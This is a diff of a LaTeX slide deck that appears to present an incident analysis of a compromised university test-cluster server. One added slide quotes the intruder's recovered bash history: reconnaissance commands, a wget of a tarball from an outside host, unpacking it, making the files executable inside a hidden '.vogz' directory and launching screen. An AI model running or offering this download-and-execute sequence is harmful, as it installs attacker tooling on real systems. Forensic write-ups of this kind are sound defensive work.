@@ -17,8 +17,11 @@
 % -----------------------------------------------------------------------------------------
 % Other things for the sample
 \usepackage{hyperref}
-\usepackage{graphicx}
 
+\usepackage{listings}
+
+
+\usepackage{graphicx}
 \graphicspath{ {./images/} }
 
 % -----------------------------------------------------------------------------------------
@@ -45,17 +48,10 @@
 \section{Background}
 
 \subsection{Introduction}
-
-\begin{itemize}
-	\item Overview of compromised test server
-	\item University network
-	\
-
-
-
-\subsection{Setup}
 \frame{\frametitle{About}
 \begin{itemize}
+	% \item Overview of compromised test server
+	% \item University network
     \item Compromised machine was a controller for a test cluster
     \item Set up on 17th November 2014
     \item Notified of breach on 24th November
@@ -107,29 +103,55 @@
 % -----------------------------------------------------------------------
 
 \section{Logs}
-\subsection{Logs}
+\subsection{Bash}
 \frame{\frametitle{Bash}
-\begin{center}
-    \item Fin.
-\end{center}
+
+% % file: \_logs.tgz
+
+% \begin{center}
+%     \item \texttt{\_bash\_history} contains the command log
+%     \item 
+% \end{center}
 }
 
-\subsection{Logs}
+\subsection{Auth logs}
 \frame{\frametitle{Syslog}
-\begin{center}
-    \item Fin.
-\end{center}
+% file: \texttt{\_logs.tgz}
+% \begin{center}
+%     \item \texttt{auth.log} contains the system auth log
+%     \item \texttt{edited\_files\_in...} contains all files edited since November 23rd
+%     \item \texttt{var\_log\_squid3} contains \texttt{/var/log/squid3}.
+% \end{center}
 }
 
 
-\subsection{Logs}
-\frame{\frametitle{Other Files}
+\subsection{Findings}
+\frame{\frametitle{Log Findings}
 % Any files edited after 23rd
+
 \begin{center}
-    \item Fin.
+
+
+
 \end{center}
 }
 
+
+\frame{\frametitle{Log Findings}
+% Any files edited after 23rd
+w
+ls
+passwd
+ifconfig
+cat /proc/cpuinfo
+wget http://descargarcs.net63.net/fv/ghh.tgz
+tar -zxf ghh.tgz
+rm -rf ghh.tgz
+chmod +x *
+cd .vogz
+chmod +x *
+screen
+}
 
 
 
@@ -143,6 +165,18 @@
     \item Fin.
 \end{center}
 }
+
+
+% \frame[fragile]{\frametitle{Log Findings}
+% Any files edited after 23rd
+
+% \begin[Language=bash]{lstlisting}
+   % grngrionigo 
+
+
+% \end{lstlisting}
+% }
+
 
 
 \frame{\frametitle{SSH Scanner}
